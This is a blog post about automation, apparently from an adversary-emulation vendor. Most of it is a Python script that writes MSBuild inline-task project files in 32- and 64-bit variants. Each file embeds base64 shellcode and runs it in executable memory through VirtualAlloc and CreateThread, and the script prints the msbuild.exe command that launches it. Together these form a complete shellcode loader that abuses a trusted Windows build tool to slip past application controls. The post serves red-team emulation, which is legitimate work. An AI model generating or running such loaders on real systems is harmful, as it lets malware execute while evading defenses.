---
layout: post
title:  "Automation for Consistency and Scale"
date:   2022-02-18 10:18:23 +0700
categories: [security]
---
Automation is a great way to test reliability in what you are doing, and to help ensure that your process is repeatable.

## Why automate?
There are a lot of reasons to automate, however three reasons that often prompt me to look at automating my solutions are the following:
+	<em>Repeatability</em> - Being able to repeat the process is important for any task that I need someone else to replicate 
+	<em>Reliability</em> - Being able to have a repeatable process increases the chance I find any errors and allows consistency with deployment
+	<em>Building complexity</em> - With complex tasks that involve multiple pieces working together, it can be difficult to understand how a small change in one place impacts the overall repeatability or reliability of the entire chain. With automation, the impact of small changes can be better understood.

## Example
Part of automating is building tools to help your workflow through increased consistency and potentially also when troubleshooting!

One of the newest SCYTHE features is easier shellcode availability for customers. I wanted to build some examples of using this new feature for customers to leverage that may not already be familiar with shellcode. There is a ton of great blogs on leveraging shellcode from tools like Metasploit, including the ired.team blog [here](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c).

That blog highlights using the MSBuild [MITRE ATT&CK Sub-Technique T1127.001](https://attack.mitre.org/techniques/T1127/001/) leveraged by adversaries to execute code. After walking through that blog post, I wanted to automate that process so I wrote a script to do part of the job for me.

I found that there were a few items that changed for me between executions that automating helped me troubleshoot faster:
+ <em>Escape characters</em> - This is a writing out characters with Python issue, but making sure to add an extra '\\' to escape certain characters is necessary
+ <em>32 vs 64 bit shellcode</em> - This is a major difference that not only requires changes to the XML document generated, but also leverages another 64 bit loader for execution afterward
+ <em>Python vs PowerShell for base64 encoding</em> - Some of the possible ways to output base64 encoded characters in Python do not work for decoding and executing in PowerShell, so making sure these encodings match up is important!

{% highlight python %}
# MSBuild Item Generator
# Credit to https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c for the idea
import sys, base64

Generic_msbuild32_string1 = """
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<!-- This inline task executes shellcode. This example XML file is modified from an example payload created by Casey Smith. It has been modified to support non-blocking shellcode loaders.-->
<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
<!-- Save This File And Execute The Above Command -->
<!-- Authors: Casey Smith, Twitter: @subTee , The Wover-->
<!-- License: BSD 3-Clause -->
<Target Name="Run">
<ClassExample />
</Target>
<UsingTask
TaskName="ClassExample"
TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
        <Code Type="Class" Language="cs">
            <![CDATA[
            using System;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            public class ClassExample :  Task, ITask
            {         
                private static UInt32 MEM_COMMIT = 0x1000;
                private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                [DllImport("kernel32")]
                private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
                [DllImport("kernel32")]
                private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
                [DllImport("kernel32")]
                private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
                public override bool Execute()
                {
			"""

Generic_msbuild32_string2 = """
		      byte[] shellcode = System.Convert.FromBase64String(b64);
                    
                    UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;
                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                    // Loop endlessly to prevent the process from exiting
                    int x = 0;
                    for (int i = 0; i==i; i++) 
                    {
                        x = i;
                        x++;
                    }
                    return true;
                } 
            }     
            ]]>
            </Code>
        </Task>
    </UsingTask>
</Project>
"""

Generic_msbuild64_string1 = """
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<!-- This inline task executes shellcode. This example XML file is modified from an example payload created by Casey Smith. It has been modified to support non-blocking shellcode loaders.-->
<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
<!-- Save This File And Execute The Above Command -->
<!-- Authors: Casey Smith, Twitter: @subTee , The Wover-->
<!-- License: BSD 3-Clause -->
<Target Name="Run">
<ClassExample />
</Target>
<UsingTask
TaskName="ClassExample"
TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
        <Code Type="Class" Language="cs">
            <![CDATA[
            using System;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            public class ClassExample :  Task, ITask
            {         
                private static UInt64 MEM_COMMIT = 0x1000;
                private static UInt64 PAGE_EXECUTE_READWRITE = 0x40;
                [DllImport("kernel32")]
                private static extern UInt64 VirtualAlloc(UInt64 lpStartAddr, UInt64 size, UInt64 flAllocationType, UInt64 flProtect);
                [DllImport("kernel32")]
                private static extern IntPtr CreateThread(UInt64 lpThreadAttributes, UInt64 dwStackSize, UInt64 lpStartAddress, IntPtr param, UInt64 dwCreationFlags, ref UInt64 lpThreadId);
                [DllImport("kernel32")]
                private static extern UInt64 WaitForSingleObject(IntPtr hHandle, UInt64 dwMilliseconds);
                public override bool Execute()
                {
			"""

Generic_msbuild64_string2 = """
		      byte[] shellcode = System.Convert.FromBase64String(b64);
                    
                    UInt64 funcAddr = VirtualAlloc(0, (UInt64)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt64 threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;
                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                    // Loop endlessly to prevent the process from exiting
                    int x = 0;
                    for (int i = 0; i==i; i++) 
                    {
                        x = i;
                        x++;
                    }
                    return true;
                } 
            }     
            ]]>
            </Code>
        </Task>
    </UsingTask>
</Project>
"""

scythe_shellcode_bin = sys.argv[1]
isit_32_or_64_shellcode = sys.argv[2]

with open(scythe_shellcode_bin, "rb") as f:
    encoded_string = base64.b64encode(f.read())
    base64_message = encoded_string.decode('UTF-8')
shellcode_string = 'string b64 = "' + base64_message +'";'

if isit_32_or_64_shellcode == '32':
    with open('bad-32.xml', 'w') as msbuild:
        msbuild.write(Generic_msbuild32_string1)
        msbuild.write(shellcode_string)
        msbuild.write(Generic_msbuild32_string2)
        print("To execute, run the following in PowerShell - C:\Windows\Microsoft.NET\Framework\\v4.0.30319\MSBuild.exe .\\bad-32.xml")
elif isit_32_or_64_shellcode == '64':
    with open('bad-64.xml', 'w') as msbuild:
        msbuild.write(Generic_msbuild64_string1)
        msbuild.write(shellcode_string)
        msbuild.write(Generic_msbuild64_string2)
        print("To execute, run the following in PowerShell - C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\MSBuild.exe .\\bad-64.xml")
else:
    print("Must specify shellcode as 32 or 64 after the file name")
print("Done.")
{% endhighlight %}

[jekyll-gh]: https://github.com/mojombo/jekyll
[jekyll]:    http://jekyllrb.com
